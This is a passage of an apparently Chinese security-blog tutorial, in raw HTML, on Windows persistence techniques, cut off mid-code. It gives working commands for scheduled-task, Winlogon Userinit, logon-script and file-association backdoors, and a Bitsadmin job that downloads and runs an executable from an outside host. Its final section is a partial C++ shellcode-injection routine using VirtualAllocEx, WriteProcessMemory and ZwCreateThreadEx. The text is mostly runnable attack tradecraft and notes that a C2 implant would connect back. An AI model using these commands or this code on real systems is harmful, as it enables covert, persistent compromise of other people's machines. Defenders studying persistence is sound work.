code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li></ul><pre class="code-snippet__js" data-lang="javascript"><code><span class="code-snippet_outer">sc <span class="code-snippet__keyword">delete</span> <span class="code-snippet__string">"SD"</span></span></code></pre></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;"><strong><br  /></strong></span></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;"><strong>0x04&nbsp;系统计划任务后门</strong></span><br  /></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;"><strong><br  /></strong></span></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">Windows实现定时任务主要有schtasks与at二种方式:</span></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">At 适用于windows xp/2003，Schtasks适用于win7/2008或者以后</span></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">每五分钟执行一次</span></section><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li></ul><pre class="code-snippet__js" data-lang="sql"><code><span class="code-snippet_outer">schtasks /<span class="code-snippet__keyword">create</span> /sc <span class="code-snippet__keyword">minute</span> /mo <span class="code-snippet__number">5</span>   /tn <span class="code-snippet__string">"sd"</span> /tr C:\Windows\System32\cmd.exe</span></code></pre></section><section style="line-height: 1.75em;"><img data-ratio="0.4549763033175355" src="图片/HACK学习呀_2021-07-03_干货最全Windows权限维持总结/13_ialysENzco5mTueXqc9UU0S57PpGtw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9O3K1gCp1h3YHth6nSsbl01prmSzb7z4Nh5bcduIL7x4nKtialysENzco5mTueXqc9UU0S57PpGtw/640?wx_fmt=png'" data-type="png" data-w="1266"  /><br  /></section><section style="line-height: 1.75em;"><strong style="font-size:15px;line-height:35px;;letter-spacing: 1px;"><br  /></strong></section><section style="line-height: 1.75em;"><strong style="font-size:15px;line-height:35px;;letter-spacing: 1px;">0x05 DLL劫持</strong><br  /></section><section style="line-height: 1.75em;"><strong style="font-size:15px;line-height:35px;;letter-spacing: 1px;"><br  /></strong></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">DLL劫持漏洞之所以被称为漏洞，还要从负责加载DLL的系统API LoadLibrary 来看。熟悉Windows代 码的同学都知道，调⽤ LoadLibrary 时可以使⽤DLL的相对路径。这时，系统会按照特定的顺序搜索⼀ 些⽬录，以确定DLL的完整路径。根据MSDN⽂档的约定，在使⽤相对路径调⽤ LoadLibrary （同样适 ⽤于其他同类DLL LoadLibraryEx，ShellExecuteEx等）时，系统会依次从以下6个位置去查找所需要的 DLL⽂件（会根据SafeDllSearchMode配置⽽稍有不同）。</span></section><ol class="list-paddingleft-2"><li style="font-size:15px;line-height:35px;;letter-spacing: 1px;"><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">程序所在⽬录。</span></section></li><li style="font-size:15px;line-height:35px;;letter-spacing: 1px;"><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">加载 DLL 时所在的当前⽬录。</span></section></li><li style="font-size:15px;line-height:35px;;letter-spacing: 1px;"><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">系统⽬录即 SYSTEM32 ⽬录。</span></section></li><li style="font-size:15px;line-height:35px;;letter-spacing: 1px;"><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">16位系统⽬录即 SYSTEM ⽬录。</span></section></li><li style="font-size:15px;line-height:35px;;letter-spacing: 1px;"><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">Windows⽬录。</span></section></li><li style="font-size:15px;line-height:35px;;letter-spacing: 1px;"><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">PATH环境变量中列出的⽬录</span></section></li></ol><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">dll劫持就发⽣在系统按照顺序搜索这些特定⽬录时。只要⿊客能够将恶意的DLL放在优先于正常DLL所在的⽬录，就能够欺骗系统优先加载恶意DLL，来实现“劫持”。</span></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">在win7及win7以上系统增加了KnownDLLs保护，需要在如下注册表下添加dll才能顺利劫持：</span></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;"></span></section><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li></ul><pre class="code-snippet__js"><code><span class="code-snippet_outer">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SessionManager\ExcludeFromKnownDlls</span></code></pre></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">关于dll劫持的文章有很多,也需要去挖掘,这里推荐一篇文章入门,也是本人写的:</span><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">https://www.cnblogs.com/punished/p/14715771.html</span><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;"><br  /></span></section><section style="line-height: 1.75em;"><br  /></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;"><strong>0x06&nbsp;Winlogon用户登录初始化</strong></span></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;"><strong><br  /></strong></span></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">winlogon.exe是windows中非常重要的进程,在用户还没登录系统之前就已经存在,并与密码验证相关的重要任务精密相关。例如，当在用户登录时，Winlogon 进程负责将用户配置文件加载到注册表中:</span><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;"><em><br  /></em></span></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;"></span></section><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li></ul><pre class="code-snippet__js"><code><span class="code-snippet_outer">HKLM\Software\Microsoft\WindowsNT\CurrentVersion\Winlogon\</span></code><code><span class="code-snippet_outer">HKCU\Software\Microsoft\Windows&nbsp;NT\CurrentVersion\Winlogon\</span></code></pre></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">对这些注册表项的恶意修改可能导致 Winlogon 加载和执行恶意 DLL 或可执行文件。</span><br  /></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">命令行:</span><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;"><em><br  /></em></span></section><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li></ul><pre class="code-snippet__js" data-lang="javascript"><code><span class="code-snippet_outer">reg <span class="code-snippet__keyword">delete</span> <span class="code-snippet__string">"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"</span> /v Userinit /f</span></code></pre></section><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li></ul><pre class="code-snippet__js" data-lang="cs"><code><span class="code-snippet_outer">reg <span class="code-snippet__keyword">add</span> <span class="code-snippet__string">"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"</span>  /v <span class="code-snippet__string">"Userinit"</span> /t REG_SZ /d <span class="code-snippet__string">"C:\Windows\system32\cmd.exe,"</span> /f</span></code></pre></section><section style="line-height: 1.75em;"><img data-ratio="0.5652951699463328" src="图片/HACK学习呀_2021-07-03_干货最全Windows权限维持总结/14_Qibto9DnOOHldRBuZrgZb25KAO9tbQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9O3K1gCp1h3YHth6nSsbl0TibeicInE8rVxoMSlDic5JczyibCJQibto9DnOOHldRBuZrgZb25KAO9tbQ/640?wx_fmt=png'" data-type="png" data-w="1118"  /></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">可以powershell一句话更改</span><br  /></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;"></span></section><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li></ul><pre class="code-snippet__js" data-lang="sql"><code><span class="code-snippet_outer"><span class="code-snippet__keyword">Set</span>-ItemProperty   <span class="code-snippet__string">"HKLM:\SOFTWARE\Microsoft\WINDOWS NT\CurrentVersion\Winlogon"</span> -<span class="code-snippet__keyword">name</span>   Userinit -<span class="code-snippet__keyword">value</span> <span class="code-snippet__string">"C:\Windows\system32\userinit.exe,C:\Windows\system32\cmd.exe"</span></span></code></pre></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;"><strong><br  /></strong></span></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;"><strong>0x07&nbsp;Logon Scripts后门</strong></span><br  /></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;"><strong><br  /></strong></span></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">Windows登录脚本，当用户登录时触发，Logon Scripts能够优先于杀毒软件执行，绕过杀毒软件对敏感操作的拦截。</span></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">注册表位置:</span></section><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li></ul><pre class="code-snippet__js"><code><span class="code-snippet_outer">HKEY_CURRENT_USER\Environment</span></code></pre></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">增加键值对</span><br  /></section><section style="line-height: 1.75em;"><img data-ratio="0.4448563484708063" src="图片/HACK学习呀_2021-07-03_干货最全Windows权限维持总结/15_CR14nCyckfTpUOmUgJtzXuxoW80afg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9O3K1gCp1h3YHth6nSsbl0RJ4C5narb8hIyVeZjtWgib6DibCR14nCyckfTpUOmUgJtzXuxoW80afg/640?wx_fmt=png'" data-type="png" data-w="1079"  /></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">&nbsp;</span></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">&nbsp;</span><img data-ratio="0.5948844884488449" src="图片/HACK学习呀_2021-07-03_干货最全Windows权限维持总结/16_Gf56vJT9ibt3WvzMhcVyU1HlpSkbvA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9O3K1gCp1h3YHth6nSsbl0wpKVsBq7nqxEZrgjXzgQGLZpgGf56vJT9ibt3WvzMhcVyU1HlpSkbvA/640?wx_fmt=png'" data-type="png" data-w="1212"  /></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">&nbsp;</span></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;"><strong>0x08 文件关联</strong></span></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;"><strong><br  /></strong></span></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">文件关联就是将一种类型的文件与一个可以打开它的程序建立起一种依存关系，一个文件可以与多个应用程序发生关联。可以利用文件的"打开方式"进行关联选择。</span></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">我们可以用assoc命令显示或修改文件扩展名关联，我们可以看一下.txt文件的关联。</span></section><section style="line-height: 1.75em;"><img data-ratio="0.46540880503144655" src="图片/HACK学习呀_2021-07-03_干货最全Windows权限维持总结/17_whdSHpgfp6towEiateBeU9omJTUhjw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9O3K1gCp1h3YHth6nSsbl0Q5M5fdxVYVHW2UPmlmxia3KyHbwhdSHpgfp6towEiateBeU9omJTUhjw/640?wx_fmt=png'" data-type="png" data-w="795"  /></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">&nbsp;用ftype命令显示或修改用在文件扩展名关联中的文件类型。</span></section><section style="line-height: 1.75em;"><img data-ratio="0.18126520681265207" src="图片/HACK学习呀_2021-07-03_干货最全Windows权限维持总结/18_gr12yePN3pXZnPvVkr53eFXEibGAYg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9O3K1gCp1h3YHth6nSsbl0m70HG7Nzo9lGeHTAjaDbzEV9mgr12yePN3pXZnPvVkr53eFXEibGAYg/640?wx_fmt=png'" data-type="png" data-w="822"  /></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">修改\HKEY_CLASS_ROOT\txtfile\shell\open\command的默认值为我们要执行的程序</span></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">修改注册表（管理员权限）：</span></section><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li></ul><pre class="code-snippet__js" data-lang="cs"><code><span class="code-snippet_outer">reg <span class="code-snippet__keyword">add</span> <span class="code-snippet__string">"HKCR\txtfile\shell\open\command"</span> /ve /t REG_EXPAND_SZ /d <span class="code-snippet__string">"C:\Windows\system32\cmd.exe %1"</span> /f</span></code></pre></section><section style="line-height: 1.75em;"><img data-ratio="0.4724220623501199" src="图片/HACK学习呀_2021-07-03_干货最全Windows权限维持总结/19_NeITQZOYZK1aLNEzXibm9hT2uzxsoQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9O3K1gCp1h3YHth6nSsbl0ibOvpsUhgpwJPoBQibKee5FnmOiaNeITQZOYZK1aLNEzXibm9hT2uzxsoQ/640?wx_fmt=png'" data-type="png" data-w="1251"  /><br  /></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">再打开txt文件打开的是cmd</span><br  /></section><section style="line-height: 1.75em;"><img data-ratio="0.3400921658986175" src="图片/HACK学习呀_2021-07-03_干货最全Windows权限维持总结/20_GozKPI69icmQErRscvbhCXS1jeZfJA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9O3K1gCp1h3YHth6nSsbl0M7IJN9EbQwbunlmqKvhibFNnIicGozKPI69icmQErRscvbhCXS1jeZfJA/640?wx_fmt=png'" data-type="png" data-w="1085"  /></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;"><strong><br  /></strong></span></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;"><strong>0x09&nbsp;Bitsadmin</strong></span></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;"><strong><br  /></strong></span></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">Windows操作系统包含各种实用程序，系统管理员可以使用它们来执行各种任务。这些实用程序之一是后台智能传输服务（BITS），它可以促进文件到Web服务器（HTTP）和共享文件夹（SMB）的传输能力。Microsoft提供了一个名为“ bitsadmin ” 的二进制文件和PowerShell cmdlet，用于创建和管理文件传输。</span></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">window7以上自带</span></section><section style="line-height: 1.75em;"><img data-ratio="0.43716814159292033" src="图片/HACK学习呀_2021-07-03_干货最全Windows权限维持总结/21_vIprrCiab657jp4Do6VzEZSmC3Pnmg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9O3K1gCp1h3YHth6nSsbl0Kia8UTBiaFhKECZpaY9TwaGGNsbvIprrCiab657jp4Do6VzEZSmC3Pnmg/640?wx_fmt=png'" data-type="png" data-w="1130"  /></section><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li></ul><pre class="code-snippet__js" data-lang="javascript"><code><span class="code-snippet_outer">.\bitsadmin.exe /transfer backdoor /download /priority high <span class="code-snippet__string">"http://192.168.1.106/CM.EXE"</span> C:\<span class="code-snippet__number">1.</span>exe</span></code></pre></section><section style="line-height: 1.75em;"><img data-ratio="0.44558991981672397" src="图片/HACK学习呀_2021-07-03_干货最全Windows权限维持总结/22_aRp2hCBmicrweyYicOIAZGFMQ4OA2A.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9O3K1gCp1h3YHth6nSsbl0fQ90nXpVwSV3JdIdQAPKcCJCBLaRp2hCBmicrweyYicOIAZGFMQ4OA2A/640?wx_fmt=png'" data-type="png" data-w="873"  /><br  /></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">将文件放入磁盘后，可以通过从“ bitsadmin ”实用程序执行以下命令来实现持久性。</span><br  /></section><ol class="list-paddingleft-2"><li style="font-size:15px;line-height:35px;;letter-spacing: 1px;"><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">在创建参数需要作业的名称</span></section></li><li style="font-size:15px;line-height:35px;;letter-spacing: 1px;"><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">该addfile需要文件的远程位置和本地路径</span></section></li><li style="font-size:15px;line-height:35px;;letter-spacing: 1px;"><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">该SetNotifyCmdLine将执行的命令</span></section></li><li style="font-size:15px;line-height:35px;;letter-spacing: 1px;"><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">所述SetMinRetryDelay定义时间回调（秒）</span></section></li><li style="font-size:15px;line-height:35px;;letter-spacing: 1px;"><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">该简历参数将运行位工作。</span></section></li></ol><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;"></span></section><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang="properties"><code><span class="code-snippet_outer"><span class="code-snippet__attr">bitsadmin</span> <span class="code-snippet__string">/create backdoor</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__attr">bitsadmin</span> <span class="code-snippet__string">/addfile backdoor "http://192.168.1.106/CM.EXE"  "C:\1.exe"</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__attr">bitsadmin</span> <span class="code-snippet__string">/SetNotifyCmdLine backdoorC:\1.exe NUL</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__attr">bitsadmin</span> <span class="code-snippet__string">/SetMinRetryDelay "backdoor" 60 </span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__attr">bitsadmin</span> <span class="code-snippet__string">/resume backdoor</span></span></code></pre></section><section style="line-height: 1.75em;"><img data-ratio="0.8358913813459268" src="图片/HACK学习呀_2021-07-03_干货最全Windows权限维持总结/23_mx6kEDaFUE3j9VNUB9qOfFVKTXuULA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9O3K1gCp1h3YHth6nSsbl0PRuPnIpMoSPF9RN0ohl1WtQQmx6kEDaFUE3j9VNUB9qOfFVKTXuULA/640?wx_fmt=png'" data-type="png" data-w="847"  /></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">这里只是随便找了个exe测试,如果是c2的马的化可以直接上线</span><br  /></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;"><br  /></span></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;"><strong>0x10 进程注入</strong></span></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;"><strong><br  /></strong></span></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">之所以把注入也放到权限维持来说,因为注入更加隐蔽,尤其是拿到高权限后,难以被发现</span></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">如果是user权限可以考虑注入exploer.exe 如果是system权限则可以注入winlogon或者lassa</span></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">记一次实战中的注入,这里是我自己写的小工具</span></section><section style="line-height: 1.75em;"><img data-ratio="0.5145784081954294" src="图片/HACK学习呀_2021-07-03_干货最全Windows权限维持总结/24_D34exnkDjAU6nEhn2jxwyJ7GJWdvFw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9O3K1gCp1h3YHth6nSsbl0YjW3Fxic8YibhafSCqhzdER7UtD34exnkDjAU6nEhn2jxwyJ7GJWdvFw/640?wx_fmt=png'" data-type="png" data-w="1269"  /></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">关于dll注入网上已经有很多教程,包括突破session 0,使用ZwCreateThreadEx创建一个线程</span></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;"><br  /></span></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">同样还有shellcode注入</span></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">一个demo</span></section><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang="cpp"><code><span class="code-snippet_outer"><span class="code-snippet__function">DWORD <span class="code-snippet__title">CeatRemoThread</span><span class="code-snippet__params">(DWORD pid)</span></span></span></code><code><span class="code-snippet_outer">{</span></code><code><span class="code-snippet_outer">HANDLE hThread;</span></code><code><span class="code-snippet_outer">DWORD dwOldProtect;</span></code><code><span class="code-snippet_outer">DWORD dwThreadId;</span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">int</span> shellcode_size = <span class="code-snippet__keyword">sizeof</span>(buf);</span></code><code><span class="code-snippet_outer"><span class="code-snippet__comment">//混淆</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">char</span>* newBuf;</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer">decrypt(buf, shellcode_size, (LPVOID*)&amp;newBuf);</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer">HANDLE hHandle = OpenProcess(PROCESS_ALL_ACCESS, <span class="code-snippet__literal">false</span>, pid);</span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">if</span> (hHandle == <span class="code-snippet__literal">NULL</span>)</span></code><code><span class="code-snippet_outer">{</span></code><code><span class="code-snippet_outer"><span class="code-snippet__built_in">printf</span>(<span class="code-snippet__string">"openprocessError"</span>);</span></code><code><span class="code-snippet_outer"><span class="code-snippet__built_in">free</span>(newBuf);</span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">return</span> FALSE;</span></code><code><span class="code-snippet_outer">}</span></code><code><span class="code-snippet_outer">LPVOID Memory = VirtualAllocEx(hHandle, <span class="code-snippet__literal">NULL</span>, <span class="code-snippet__keyword">sizeof</span>(newBuf) + <span class="code-snippet__number">1</span>, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer">SIZE_T dwSize = <span class="code-snippet__number">0</span>;</span></code><code><span class="code-snippet_outer">WriteProcessMemory(hHandle, Memory, newBuf, shellcode_size / <span class="code-snippet__number">3</span>, &amp;dwSize);</span></code><code><span class="code-snippet_outer"><span class="code-snippet__comment">//Sleep(3000);</span></span></code><code><span class="code-snippet_outer">VirtualProtectEx(hHandle, Memory, shellcode_size / <span class="code-snippet__number">3</span>, PAGE_EXECUTE, &amp;dwOldProtect);</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer">HMODULE hNtdll = LoadLibrary(<span class="code-snippet__string">L"ntdll.dll"</span>);</span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">if</span> (hNtdll == <span class="code-snippet__literal">NULL</span>)</span></code><code><span class="code-snippet_outer">{</span></code><code><span class="code-snippet_outer"><span class="code-snippet__built_in">printf</span>(<span class="code-snippet__string">"[!] LoadNTdll Error,Error is:%d\n"</span>, GetLastError());</span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">return</span> FALSE;</span></code><code><span class="code-snippet_outer">}</span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">else</span></span></code><code><span class="code-snippet_outer">{</span></code><code><span class="code-snippet_outer"><span class="code-snippet__built_in">printf</span>(<span class="code-snippet__string">"[*] Load ntdll.dll Successfully!\n"</span>);</span></code><code><span class="code-snippet_outer">}</span></code><code><span class="code-snippet_outer"><span class="code-snippet__meta">#<span class="code-snippet__meta-keyword">ifdef</span> _WIN64</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__function"><span class="code-snippet__keyword">typedef</span> <span class="code-snippet__title">DWORD</span><span class="code-snippet__params">(WINAPI* typedef_ZwCreateThreadEx)</span><span class="code-snippet__params">(</span></span></span></code><code><span class="code-snippet_outer">PHANDLE ThreadHandle,</span></code><code><span class="code-snippet_outer">ACCESS_MASK DesiredAccess,</span></code><code><span class="code-snippet_outer">LPVOID ObjectAttributes,</span></code><code><span class="code-snippet_outer">HANDLE ProcessHandle,</span></code><code><span class="code-snippet_outer">LPTHREAD_START_ROUTINE lpStartAddress,</span></code><code><span class="code-snippet_outer">LPVOID lpParameter,</span></code><code><span class="code-snippet_outer">ULONG CreateThreadFlags,</span></code><code><span class="code-snippet_outer">SIZE_T ZeroBits,</span></code><code><span class="code-snippet_outer">SIZE_T StackSize,</span></code><code><span class="code-snippet_outer">SIZE_T MaximumStackSize,</span></code><code><span class="code-snippet_outer">LPVOID pUnkown</span></code><code><span class="code-snippet_outer"><span class="code-snippet_outer">)</span>;</span></code><code><span class="code-snippet_outer"><span class="code-snippet__meta">#<span class="code-snippet__meta-keyword">else</span></span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__function"><span class="code-snippet__keyword">typedef</span> <span class="code-snippet__title">DWORD</span><span class="code-snippet__params">(WINAPI* typedef_ZwCreateThreadEx)</span><span class="code-snippet__params">(</span></span></span></code><code><span class="code-snippet_outer">PHANDLE ThreadHandle,</span></code><code><span class="code-snippet_outer">ACCESS_MASK DesiredAccess,</span></code><code><span class="code-snippet_outer">LPVOID ObjectAttributes,</span></code><code><span class="code-snippet_outer">HANDLE ProcessHandle,</span></code><code><span class="code-snippet_outer">LPTHREAD_START_ROUTINE lpStartAddress,</span></code><code><span class="code-snippet_outer">LPVOID lpParameter,</span></code><code><span class="code-snippet_outer">BOOL CreateSuspended,</span></code><code><span class="code-snippet_outer">DWORD dwStackSize,</span></code><code><span class="code-snippet_outer">DWORD dw1,</span></code><code><span class="code-snippet_outer">DWORD dw2,</span></code><code><span class="code-snippet_outer">LPVOID pUnkown</span></code><code><span class="code-snippet_outer"><span class="code-snippet_outer">)</span>;</span></code><code><span class="code-snippet_outer"><span class="code-snippet__meta">#<span class="code-snippet__meta-keyword">endif</span></span></span></code><code><span class="code-snippet_outer">typedef_ZwCreateThreadEx ZwCreateThreadEx = <span class="code-snippet__literal">NULL</span>;</span></code><code><span class="code-snippet_outer">ZwCreateThreadEx = (typedef_ZwCreateThreadEx)::GetProcAddress(hNtdll, <span class="code-snippet__string">"ZwCreateThreadEx"</span>);</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">if</span> (ZwCreateThreadEx == <span class="code-snippet__literal">NULL</span>)</span></code><code><span class="code-snippet_outer">{</span></code><code><span class="code-snippet_outer"><span class="code-snippet__built_in">printf</span>(<span class="code-snippet__string">"[!] Get ZwCreateThreadEx Address Error,Error is:%d\n"</span>, GetLastError());</span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">return</span> FALSE;</span></code><code><span class="code-snippet_outer">}</span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">else</span></span></code><code><span class="code-snippet_outer">{</span></code><code><span class="code-snippet_outer"><span class="code-snippet__built_in">printf</span>(<span 